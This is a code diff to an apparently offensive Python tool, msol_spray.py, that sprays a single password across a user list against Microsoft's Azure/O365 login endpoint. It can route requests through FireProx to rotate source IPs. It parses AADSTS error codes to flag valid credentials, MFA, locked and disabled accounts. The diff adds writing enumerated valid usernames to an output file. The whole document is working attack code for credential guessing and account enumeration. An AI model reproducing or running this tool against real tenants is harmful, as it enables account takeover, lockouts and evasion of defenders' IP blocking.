@@ -1,6 +1,6 @@
 #! /usr/bin/env python3
 
-# 
+#
 # Requires Python 3.7+ & aiohttp (speedups recommended)
 # pip3 install aiohttp[speedups]
 #
@@ -26,21 +26,29 @@ This command uses the specified FireProx URL to spray from randomized IP address
     python3 msol_spray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox
 """
 
-parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
+parser = argparse.ArgumentParser(
+    description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
 
-parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line")
-parser.add_argument("-d", "--domain", required=True, help="The domain excluding the @ sign (example.com)")
-parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
-parser.add_argument("-t", "--threads", default="25", help="The number of threads to run. Default is 25")
-parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
-
+parser.add_argument("-u", "--userlist", metavar="FILE",
+                    required=True, help="File filled with usernames one-per-line")
+parser.add_argument("-d", "--domain", required=True,
+                    help="The domain excluding the @ sign (example.com)")
+parser.add_argument("-p", "--password", required=True,
+                    help="A single password that will be used to perform the password spray. (Required)")
+parser.add_argument("-t", "--threads", default="25",
+                    help="The number of threads to run. Default is 25")
+parser.add_argument("-o", "--outfile", default="enumed_users.lst",
+                    help="Outputs enumerated users to file you specify.")
+parser.add_argument("--url", default="https://login.microsoft.com",
+                    help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
 args = parser.parse_args()
-user_names = args.userlist
-pass_word = args.password
-url = args.url
-domain = args.domain
-threads = int(args.threads)
 
+user_list = args.userlist
+pass_word = args.password
+domain = args.domain
+url = args.url
+threads = int(args.threads)
+outfile = open(args.outfile, "w")
 
 
 handler = logging.StreamHandler()
@@ -56,14 +64,17 @@ task_username = contextvars.ContextVar('username')
 
 old_factory = logging.getLogRecordFactory()
 
+
 def new_factory(*args, **kwargs):
     record = old_factory(*args, **kwargs)
     username = task_username.get(None)
     if username:
-        record.msg = f"{username:<30} - {record.msg}"
+        record.msg = f"{username:<1} - {record.msg}"
     return record
 
+
 logging.setLogRecordFactory(new_factory)
+
 
 async def spray(session: aiohttp.ClientSession, sem: asyncio.BoundedSemaphore, username: str, password: str) -> None:
     async with sem:
@@ -73,7 +84,7 @@ async def spray(session: aiohttp.ClientSession, sem: asyncio.BoundedSemaphore, u
             'resource': 'https://graph.windows.net',
             'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
             'client_info': '1',
-            'grant_type': 'password', 
+            'grant_type': 'password',
             'username': username + '@' + domain,
             'password': password,
             'scope': 'openid'
@@ -95,29 +106,34 @@ async def spray(session: aiohttp.ClientSession, sem: asyncio.BoundedSemaphore, u
 
                 if "AADSTS50126" in error:
                     log.debug("Enumerated User/Invalid password.")
+                    outfile.write(username + '@' + domain + '\n')
                 elif "AADSTS50128" in error or "AADSTS50059" in error:
-                    log.debug("Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
+                    log.debug(
+                        "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
                 elif "AADSTS50034" in error:
                     pass
                     #log.debug("The user doesn't exist.")
                 elif "AADSTS50079" in error or "AADSTS50076" in error:
-                    log.debug("Credential valid however the response indicates MFA (Microsoft) is in use.")
+                    log.debug(
+                        "Credential valid however the response indicates MFA (Microsoft) is in use.")
                 elif "AADSTS50158" in error:
-                    log.debug("Credential valid however the response indicates conditional access (MFA: DUO or other) is in use.")
+                    log.debug(
+                        "Credential valid however the response indicates conditional access (MFA: DUO or other) is in use.")
                 elif "AADSTS50053" in error:
                     log.debug("The account appears to be locked.")
                 elif "AADSTS50057" in error:
                     log.debug("The account appears to be disabled.")
                 elif "AADSTS50055" in error:
-                    log.debug("Credential valid however the user's password is expired.")
+                    log.debug(
+                        "Credential valid however the user's password is expired.")
                 else:
                     log.debug(f"Got unknown error: {error}")
+
 
 async def username_generator(usernames: str):
     path = pathlib.Path(usernames)
     if path.exists():
         usernames = open(path.expanduser())
-
 
     try:
         for user in usernames:
@@ -125,6 +141,7 @@ async def username_generator(usernames: str):
     finally:
         if path.exists():
             usernames.close()
+
 
 async def main(usernames: str, password: str, threads: int) -> None:
     connector = aiohttp.TCPConnector(ssl=False)
@@ -141,9 +158,9 @@ if __name__ == '__main__':
 
     asyncio.run(
         main(
-            user_names,
+            user_list,
             pass_word,
             threads
         )
     )
-
+outfile.close()
